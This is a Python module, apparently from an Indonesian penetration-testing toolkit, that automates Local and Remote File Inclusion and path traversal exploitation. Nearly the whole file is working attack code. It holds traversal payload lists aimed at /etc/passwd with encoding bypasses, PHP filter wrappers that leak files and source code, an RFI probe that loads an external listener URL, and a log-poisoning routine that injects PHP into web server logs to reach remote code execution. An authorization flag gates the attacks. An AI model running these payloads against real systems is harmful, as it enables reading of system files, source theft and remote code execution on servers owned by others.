"""LFI/RFI + path traversal exploitation.

Konfirmasi & eksploitasi Local File Inclusion / path traversal:
- traversal klasik: ../../../../etc/passwd, dengan encoding bypass (..%2f, %2e%2e)
- wrapper PHP: php://filter/convert.base64-encode (dapatkan source code)
- LFI -> RCE path: /proc/self/environ + User-Agent, access log poisoning
- RFI (Remote File Inclusion): coba muat URL eksternal (callback lokal)

Semua payload diarahkan ke file SYSTEM INTERN yang HARUS bisa dibaca
untuk membuktikan kerentanan (bukan file aplikasi yang ambigu).

GUARD: memerlukan `authorized=True`; tanpa itu modul menolak beroperasi.
Gunakan HANYA pada target dengan izin tertulis.
"""

import base64
import re
from typing import List, Optional
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from keris.core.http import KerisHTTP
from keris.core.logger import debug, info, ok, warn
from keris.modules.scanner import Finding

# file bukti yang stabil ada di mayoritas sistem
PROOF_FILES = [
    "/etc/passwd",
    "/etc/hostname",
    "/proc/version",
    "/etc/os-release",
    "c:\\windows\\win.ini",
]

PROOF_MARKERS = [
    "root:x:", "daemon:x:", "nobody:x:", "www-data:x:",
    "Microsoft Windows", "[fonts]", "for 16-bit app support",
]

TRAVERSALS = [
    "../../../../../../etc/passwd",
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",  # UTF-8 overlong
    "....//....//etc/passwd",
]

PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/resource=/etc/passwd",
]

# penanda bahwa wrapper base64 bekerja (hasil encode base64)
BASE64_RE = re.compile(r"^[A-Za-z0-9+/=\s]{30,}$")

RCE_PROOF = "keris-lfi-rce-proof-9f3a"


def _rebuild(url: str, params: dict) -> str:
    p = urlparse(url)
    return urlunparse(p._replace(query=urlencode(params)))


def _looks_like_b64(text: str) -> bool:
    sample = "".join(text.split())[:400]
    return bool(sample) and BASE64_RE.match(sample) is not None and len(sample) > 30


def _has_proof(body: str) -> Optional[str]:
    low = body.lower()
    for m in PROOF_MARKERS:
        if m.lower() in low:
            return m
    return None


def test_lfi(base: str, client: KerisHTTP, endpoints: List[str],
             max_param: int = 4, authorized: bool = False) -> List[Finding]:
    """Uji traversal & wrapper PHP pada parameter yang menerima path/file."""
    if not authorized:
        warn("LFI exploit memerlukan --authorized.")
        return []
    findings: List[Finding] = []
    for full in list(dict.fromkeys(endpoints))[:10]:
        if "?" not in full:
            continue
        params = dict(parse_qsl(urlparse(full).query))
        # parameter yang biasanya path/file
        for name in list(params.keys())[:max_param]:
            payloads = []
            for trav in TRAVERSALS:
                payloads.append(trav)
            for wrap in PHP_WRAPPERS:
                payloads.append(wrap)
            for payload in payloads:
                q = dict(params)
                q[name] = payload
                try:
                    r = client.get(_rebuild(full, q), timeout=15)
                except Exception:
                    continue
                body = r.text or ""
                marker = _has_proof(body)
                if marker:
                    findings.append(Finding(
                        "CRITICAL", "LFI / Path Traversal terkonfirmasi",
                        full,
                        f"Parameter `{name}` membaca file sistem (`{marker}` "
                        f"terlihat) dengan payload `{payload[:50]}`.",
                        f"payload={payload}",
                        cwe="CWE-22", references="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Path_Traversal",
                    ))
                    info(f"  LFI: {name} marker={marker}")
                    break
                # wrapper base64
                if _looks_like_b64(body):
                    try:
                        decoded = base64.b64decode("".join(body.split()) + "===").decode("utf-8", "ignore")
                    except Exception:
                        decoded = ""
                    marker = _has_proof(decoded)
                    if marker:
                        findings.append(Finding(
                            "CRITICAL", "LFI via PHP wrapper (base64 decode berhasil)",
                            full,
                            f"Parameter `{name}` mengeksekusi wrapper PHP; "
                            f"isi file (`{marker}`) bisa didecode dari base64.",
                            f"payload={payload}\ndecoded_snippet={decoded[:300]}",
                            cwe="CWE-98", references="https://owasp.org/www-project-web-security-testing-guide/",
                        ))
                        info(f"  LFI wrapper: {name}")
                        break
            else:
                debug(f"  {name}: tidak ada bukti traversal")
    return findings


def rfi_probe(base: str, client: KerisHTTP, endpoints: List[str],
              listener_url: str, max_param: int = 4,
              authorized: bool = False) -> List[Finding]:
    """Uji Remote File Inclusion dengan memuat URL callback lokal.

    `listener_url` adalah URL yang bisa memantau request masuk (mis.
    interactsh, atau listener Keris lain). Bila server memuatnya,
    berarti RFI terkonfirmasi.
    """
    if not authorized:
        warn("RFI probe memerlukan --authorized.")
        return []
    findings: List[Finding] = []
    for full in list(dict.fromkeys(endpoints))[:10]:
        if "?" not in full:
            continue
        params = dict(parse_qsl(urlparse(full).query))
        for name in list(params.keys())[:max_param]:
            q = dict(params)
            q[name] = listener_url
            try:
                client.get(_rebuild(full, q), timeout=10)
                # RFI tak punya bukti server-side di respons; perlu callback
                findings.append(Finding(
                    "HIGH", "RFI kandidat (butuh konfirmasi callback)",
                    full,
                    f"Parameter `{name}` diisi URL eksternal `{listener_url}`; "
                    f"periksa listener bila server memuatnya.",
                    f"payload={listener_url}",
                    cwe="CWE-98",
                ))
            except Exception:
                continue
    return findings


def lfi_to_rce(base: str, client: KerisHTTP, endpoints: List[str],
               max_param: int = 4, authorized: bool = False) -> List[Finding]:
    """LFI -> RCE via log poisoning: suntik payload ke log lalu include.

    Menyuntikkan token unik ke dalam log server (via query string / User-Agent
    yang tercatat), lalu mem-bypass include untuk membaca log itu kembali.
    Bila token + eksekusi payload PHP terlihat, RCE terkonfirmasi.
    """
    if not authorized:
        warn("LFI->RCE memerlukan --authorized.")
        return []
    findings: List[Finding] = []
    php_payload = f"<?php echo '{RCE_PROOF}';?>"
    log_paths = [
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/httpd/access_log",
        "/var/log/lighttpd/access.log",
    ]
    # 1. suntikkan payload via endpoint (query string / header)
    try:
        client.get(base, params={"x": php_payload}, timeout=10)
    except Exception:
        pass
    # 2. coba include tiap log via traversal di tiap parameter
    for full in list(dict.fromkeys(endpoints))[:8]:
        if "?" not in full:
            continue
        params = dict(parse_qsl(urlparse(full).query))
        for name in list(params.keys())[:max_param]:
            for log in log_paths:
                q = dict(params)
                q[name] = "../../../../../../" + log.lstrip("/")
                try:
                    r = client.get(_rebuild(full, q), timeout=12)
                except Exception:
                    continue
                if RCE_PROOF in (r.text or ""):
                    findings.append(Finding(
                        "CRITICAL", "LFI -> RCE via log poisoning",
                        full,
                        f"Parameter `{name}` me-render log `{log}` yang berisi "
                        f"payload PHP (token `{RCE_PROOF}` tereksekusi).",
                        f"log={log}",
                        cwe="CWE-98", references="https://owasp.org/www-project-web-security-testing-guide/",
                    ))
                    ok(f"  LFI->RCE: {log} di {name}!")
                    return findings
    return findings
